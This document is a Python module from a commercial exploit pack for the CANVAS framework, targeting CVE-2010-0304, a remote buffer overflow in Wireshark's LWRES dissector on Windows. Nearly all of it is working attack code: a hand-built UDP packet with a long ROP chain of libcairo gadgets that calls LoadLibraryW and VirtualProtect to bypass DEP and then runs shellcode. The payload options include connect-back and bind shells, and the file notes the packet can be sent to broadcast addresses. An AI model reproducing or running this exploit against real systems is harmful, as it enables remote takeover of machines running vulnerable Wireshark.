
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
if "." not in sys.path: sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")
import os
import socket
import sys
import struct
from struct import *

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from encoder import addencoder
from shellcode import shellcodeGenerator
from linuxNode import linuxNode
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
import time
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Wireshark <= 1.2.5 LWRES Dissector Remote Overflow"
DESCRIPTION = "Exploits an issue in the LWRES Dissector"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "28th January 2010"
DOCUMENTATION["Repeatability"]="N/A"
DOCUMENTATION['CVE Name']='CVE-2010-0304'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0304'
DOCUMENTATION['CVSS'] = '7.5'
DOCUMENTATION["References"] = "http://www.wireshark.org/security/wnpa-sec-2010-01.html"
DOCUMENTATION['Notes'] = """
Wireshark's dissect_getaddrsbyname_request() function fails to sanitize user-supplied input.
Sent via UDP, Can be used against broadcast address"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "2003", "XP", "Vista", "7" ]

PORT = 921
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets,PORT)
    return

targets = {
    0 : ["Universal DEP Bypass (1.1.3 -> 1.2.5)", (0x00000000), []],
    1 : ["Universal Non DEP (All versions)", (0x00000000), []]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS = ["TCP Connect Back",
                "IE Inject Connect Back",
                "HTTPMOSDEF SSL",
                "HTTPMOSDEF PLAIN",
                "Bind MOSDEF Shell",
                "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        return
    
    def usage(self):
        self.wp_usage(targets)
        return

    #def test(self):
	
     #   return True

    def neededListenerTypes(self):
        self.getArgs()    
	
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targetting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()   

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload  = "\x00\x00\x01\x5d\x00\x00\x00\x00\x4b\x49\x1c\x52\x00\x01\x00\x01"
        payload += "\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        payload += "\x00\x00\x00\x01\x35\xbe"
        payload += "A" * 44

        if self.version == 0:
            payload2= ""
            payload2 +="B" * 400
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            payload2 += pack('<L', 0x68E1BA1B) #ret buffer to accomodate for different versions
            # Find our ESP
            payload2 += pack('<L', 0x68DCB3C9) #libcairo  Push ESP, Pop EBX
            payload2 += pack('<L', 0x91919191) # Buffer
            # Store it into EAX. EAX is more adjustable
            payload2 += pack('<L', 0x68DC51F4) #libcairo  Mov EAX,EBX
            payload2 += pack('<L', 0x91919191) # Buffer        
            payload2 += pack('<L', 0x91919191) # Buffer     
            
            #Pop a value into EBX, to adjust EAX by. This moves down the stack.
            payload2 += pack('<L', 0x68DC2B99) # libcairo pop EBX
            payload2 += pack('<L', 0xFFFFFEB4) # Adjustment amount
            payload2 += pack('<L', 0x91919191) # Buffer
            # Do the adjustment
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx (ebx is  a negative, this is to move eax down)
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer                          
            # EAX now holds our 'writeable' stack spot. move it into EDX
            payload2 += pack('<L', 0x68DED5C9) # libcairo  Mov EDX,EAX
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer
            
            # Inc EAX by 4
            payload2 += pack('<L', 0x68DE091B) # libcairo  Add EAX,2
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x68DE091B) # libcairo  Add EAX,2
            payload2 += pack('<L', 0x91919191) # Buffer            
            
            # 'push' the location of our stack spot          
            payload2 += pack('<L', 0x68DC9BCE) # libcairo  MOV DWORD PTR DS:[EDX],EAX
            payload2 += pack('<L', 0x91919191) # Buffer                      
            payload2 += pack('<L', 0x68E4339B) # libcairo  Add edx,4
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer             
            
            # Pop two values for calculation, and do the calulation
            # We want to write unicode MSVCR90\x00 -> 00510FE8  6D 00 73 00 76 00 63 00 72 00 39 00 30 00 00 00 
            # 6D 00 73 00       
            payload2 += pack('<L', 0x68DC2B98) # libcairo  Pop EAX,EBX
            payload2 += pack('<L', 0x1184117E) # Buffer
            payload2 += pack('<L', 0x11111111) # Buffer  
            payload2 += pack('<L', 0x91919191) # Buffer                              
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer
            # write it to our 'stack'
            payload2 += pack('<L', 0x68DC9BCE) # libcairo  MOV DWORD PTR DS:[EDX],EAX
            payload2 += pack('<L', 0x91919191) # Buffer                      
            payload2 += pack('<L', 0x68E4339B) # libcairo  Add edx,4
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            
            # Pop two values for calculation, and do the calulation
            # We want to write unicode MSVCR90\x00 -> 00510FE8  6D 00 73 00 76 00 63 00 72 00 39 00 30 00 00 00 
            # 76 00 63 00       
            payload2 += pack('<L', 0x68DC2B98) #libcairo  Pop EAX,EBX
            payload2 += pack('<L', 0x11741187) # Buffer
            payload2 += pack('<L', 0x11111111) # Buffer  
            payload2 += pack('<L', 0x91919191) # Buffer                              
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            # write it to our 'stack'                
            payload2 += pack('<L', 0x68DC9BCE) # libcairo  MOV DWORD PTR DS:[EDX],EAX
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x68E4339B) # libcairo  Add edx,4
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer            
            
            # Pop two values for calculation, and do the calulation
            # We want to write unicode MSVCR90\x00 -> 00510FE8  6D 00 73 00 76 00 63 00 72 00 39 00 30 00 00 00 
            # 72 00 39 00       
            payload2 += pack('<L', 0x68DC2B98) #libcairo  Pop EAX,EBX
            payload2 += pack('<L', 0x114A1183) # Buffer
            payload2 += pack('<L', 0x11111111) # Buffer  
            payload2 += pack('<L', 0x91919191) # Buffer                              
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            # write it to our 'stack'                
            payload2 += pack('<L', 0x68DC9BCE) # libcairo  MOV DWORD PTR DS:[EDX],EAX
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x68E4339B) # libcairo  Add edx,4
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer            

            # Pop two values for calculation, and do the calulation
            # We want to write unicode MSVCR90\x00 -> 00510FE8  6D 00 73 00 76 00 63 00 72 00 39 00 30 00 00 00 
            # 30 00 00 00       
            payload2 += pack('<L', 0x68DC2B98) #libcairo  Pop EAX,EBX
            payload2 += pack('<L', 0x11111141) # Buffer
            payload2 += pack('<L', 0x11111111) # Buffer  
            payload2 += pack('<L', 0x91919191) # Buffer                              
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            # write it to our 'stack'                
            payload2 += pack('<L', 0x68DC9BCE) # libcairo  MOV DWORD PTR DS:[EDX],EAX
            payload2 += pack('<L', 0x91919191) # Buffer
            
            # make call to LoadLibraryW
            payload2 += pack('<L', 0x68E4C568) #  JMP DWORD PTR DS:[<&KERNEL32.LoadLibrary>; kernel32.LoadLibraryW
            
            #return from LoadLibraryW
            payload2 += pack('<L', 0x68dc1344) # libcairo pop ,pop,pop,ret
            
            #Space for written data (Address of string and dll name its unicode so we need to craft it :/)
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            
            # at this point EAX is our msvcr90 base
            # [Base + 11A0] is virtualprotect
            payload2 += pack('<L', 0x68DC2B99) # libcairo pop EBX
            payload2 += pack('<L', 0xFFFFEE60) # Adjustment amount
            payload2 += pack('<L', 0x91919191) # Buffer
            # Do the adjustment
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx (ebx is  a negative, this is to move eax down)
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer            
            # at this point EAX points to a ptr to Virtual Protect
            # move it to ECX for storage
            payload2 += pack('<L', 0x68DE8C7D) # libcairo  MOV ECX,EAX
                        
            # Set up the call
            payload2 += pack('<L', 0x68DCB3C9) #libcairo  Push ESP, Pop EBX
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x68DC51F4) #libcairo  Mov EAX,EBX
            payload2 += pack('<L', 0x91919191) # Buffer        
            payload2 += pack('<L', 0x91919191) # Buffer             
            
            payload2 += pack('<L', 0x68DC2B99) # libcairo pop EBX
            payload2 += pack('<L', 0xFFFFFF34) # Buffer (ESP+0xcc in length)
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx (ebx is  a negative, this is to move eax down)
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer                          

            payload2 += pack('<L', 0x68DED5C9) # libcairo  Mov EDX,EAX
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer
            
            payload2 += pack('<L', 0x68DC9BCE) # libcairo  MOV DWORD PTR DS:[EDX],EAX
            payload2 += pack('<L', 0x91919191) # Buffer                      
            payload2 += pack('<L', 0x68E4339B) # libcairo  Add edx,4
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer             
            
            payload2 += pack('<L', 0x68DC2B98) # libcairo  Pop EAX,EBX
            payload2 += pack('<L', 0x11111111) # Buffer
            payload2 += pack('<L', 0x11110111) # Buffer  
            payload2 += pack('<L', 0x91919191) # Buffer                              
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx (Size)
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer                 
            payload2 += pack('<L', 0x68DC9BCE) # libcairo  MOV DWORD PTR DS:[EDX],EAX
            payload2 += pack('<L', 0x91919191) # Buffer                      
            payload2 += pack('<L', 0x68E4339B) # libcairo  Add edx,4
            payload2 += pack('<L', 0x91919191) # Buffer 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer 
            # write it again          
            payload2 += pack('<L', 0x68DC2B98) #libcairo  Pop EAX,EBX
            payload2 += pack('<L', 0x11111111) # Buffer
            payload2 += pack('<L', 0x111110D1) # Buffer  
            payload2 += pack('<L', 0x91919191) # Buffer                              
            payload2 += pack('<L', 0x68DDFB34) # libcairo  Sub eax,ebx (Protection Mode)
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x79010101) # High value to ESI 
            payload2 += pack('<L', 0x91919191) # Buffer              
            payload2 += pack('<L', 0x91919191) # Buffer                 
            payload2 += pack('<L', 0x68DC9BCE) # libcairo  MOV DWORD PTR DS:[EDX],EAX
            payload2 += pack('<L', 0x91919191) # Buffer                                     
            
            # move ptr from ecx -> EDI
            payload2 += pack('<L', 0x68DE8C7F) # libcairo  Mov EAX,ECX
            payload2 += pack('<L', 0x68DD94F2) # libcairo  Push EAX, POP EBP
            payload2 += pack('<L', 0x68DEA2A3) # libcairo  Mov EDI,EBP
            
            # Make the call
            payload2 += pack('<L', 0x68DDFB26) # libcairo   CALL DWORD PTR DS:[EDI]
            payload2 += pack('<L', 0x91919191) # Space for written values
            payload2 += pack('<L', 0x91919191) # Space for written values
            payload2 += pack('<L', 0x91919191) # Space for written values
            payload2 += pack('<L', 0x68e4d001) # VP Writeable
            payload2 += pack('<L', 0x91919191) # Buffer        
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x91919191) # Buffer
            payload2 += pack('<L', 0x68DCDDB2) # libcairo  JMP ESP   
            
            # Small jmp to larger shellcode
            payload2 += "\x54\x59\x33\xdb\x66\xbb\x64\x07\x03\xcb\xff\xe1"
                        
            payload2 += "C" * (4 - len(payload2) % 4)
            
            payload2 += pack('<L', 0x68E1BA11) * ((3000-len(payload2)) /4) #libcairo  ADD ESP,5A4, pop, ret #2088
            #payload2 += pack('<L', 0x68E1BA11) #libcairo  ADD ESP,5A4, pop, ret
            payload2 += self.shellcode
            payload2 += "\x00\x00"
            
            payload += payload2
            
            print "Payload2 = %d"%len(payload2)

        elif self.version == 1:
            #payload += "\x90\x90\xeb\x06\xA7\x16\xB4\x61"*260
            #payload += "\x90\x90\xeb\x08\x90\x90\xeb\x06\xA7\x16\xB4\x61"
            payload += pack('<L', 0x61b4151d) * (3000 /4) #PCRE3.dll POP,POP,RET (Also executable NOP worths)
            
            payload += "\x90"*4
            payload += self.shellcode
            payload += "\x00\x00"

        return payload


    def run(self):

        s = self.getudpsock()
        payload = self.makesploit()

        try:
            self.log("WP> Sending Exploit to target: %s:%d"%(self.host,self.port))
            s.sendto(payload, (self.host, self.port))
            s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed?)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(10)
        
        # Check if follow up is required for some shellcodes
        ret = self.wp_postExploitShellcode(s)
        if ret:
            return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret
    
if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
